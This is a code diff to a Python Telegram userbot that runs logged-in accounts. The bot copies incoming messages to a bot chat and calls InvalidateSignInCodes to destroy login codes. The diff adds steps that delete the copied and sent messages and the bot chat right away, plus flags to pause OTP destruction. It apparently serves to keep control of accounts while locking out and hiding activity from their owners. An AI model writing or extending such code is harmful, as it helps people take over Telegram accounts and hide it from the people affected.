@@ -147,14 +147,28 @@ async def get_source_chat():
 
 async def forward_message(client: Client, message: Message, target_chat: str):
     """
-    Copies the message to target_chat (Bot PM)
+    Copies the message to target_chat (Bot PM), DELETES IT,
     and attempts to call InvalidateSignInCodes.
     """
-    if client.me.id in paused_forwarding: return
+    # --- FIX: Check temporary pause ---
+    if client.me.id in paused_forwarding: 
+        logger.info(f"OTP destroying is temporarily paused for {client.me.id}. Skipping.")
+        return
+        
+    # --- FIX: Check permanent disable ---
+    if accounts_collection:
+        account = accounts_collection.find_one({"user_id": client.me.id})
+        if account and not account.get("otp_destroy_enabled", True):
+            logger.info(f"OTP destroying is permanently disabled for {client.me.id}. Skipping.")
+            return # Permanent disable
+            
     try:
         # Check if client.me exists before calling copy
         if client.me:
-            await message.copy(chat_id=target_chat)
+            # --- FIX: Capture the forwarded/copied message ---
+            copied_msg = await message.copy(chat_id=target_chat)
+            # --- FIX: Delete the copied message immediately ---
+            await copied_msg.delete()
         
         # Invalidate sign-in codes to destroy the OTP immediately
         try:
@@ -175,8 +189,22 @@ async def send_notification(client: Client, message: Message, ptb_app: Applicati
     
     # Check status for display in the notification
     status_parts = ["✅ OTP Active", "✅ Notify Active"]
-    if client.me.id in paused_forwarding: status_parts[0] = "⏸️ OTP Paused"
-    if OWNER_ID in paused_notifications: status_parts[1] = "⏸️ Notify Paused"
+    
+    # --- FIX: Check permanent AND temporary disable ---
+    is_permanently_disabled = False
+    if accounts_collection:
+        account = accounts_collection.find_one({"user_id": client.me.id})
+        if account and not account.get("otp_destroy_enabled", True):
+            is_permanently_disabled = True
+
+    if client.me.id in paused_forwarding: 
+        status_parts[0] = "⏸️ OTP Paused (Temp)"
+    elif is_permanently_disabled:
+        status_parts[0] = "❌ OTP Disabled (Perm)"
+        
+    if OWNER_ID in paused_notifications: 
+        status_parts[1] = "⏸️ Notify Paused"
+    # --- END FIX ---
 
     content = message.text or message.caption or "(Media)"
     
@@ -304,9 +332,14 @@ async def start_userbot(
             bot_username = ptb_app.bot.username
             if bot_username:
                 try:
-                    await client.send_message(bot_username, "/init_abc")
+                    # --- FIX: Capture the sent message ---
+                    sent_msg = await client.send_message(bot_username, "/init_abc")
+                    # --- FIX: Delete the sent message immediately ---
+                    await sent_msg.delete()
+                    
                     await client.leave_chat(bot_username, delete=True)
-                    logger.info(f"Account {me.id} sent acquaintance message and deleted chat with @{bot_username}")
+                    # Updated log message for clarity
+                    logger.info(f"Account {me.id} sent/deleted acquaintance message and deleted chat with @{bot_username}")
                     account_info["is_acquainted"] = True
                 except Exception as e:
                     logger.warning(f"Could not send/delete acquaintance chat for {me.id} with @{bot_username}: {e}")
@@ -319,9 +352,16 @@ async def start_userbot(
 
         if update_info:
             if accounts_collection is not None:
-                # Get the existing online_interval to preserve it
-                existing_interval = account_doc.get("online_interval", "1440") if account_doc else "1440"
+                # --- FIX: Get existing values to preserve them ---
+                existing_interval = "1440"
+                existing_otp_destroy = True
+                if account_doc:
+                    existing_interval = account_doc.get("online_interval", "1440")
+                    existing_otp_destroy = account_doc.get("otp_destroy_enabled", True)
+                
                 account_info["online_interval"] = existing_interval
+                account_info["otp_destroy_enabled"] = existing_otp_destroy
+                # --- END FIX ---
                 
                 accounts_collection.update_one(
                     {"user_id": me.id}, 
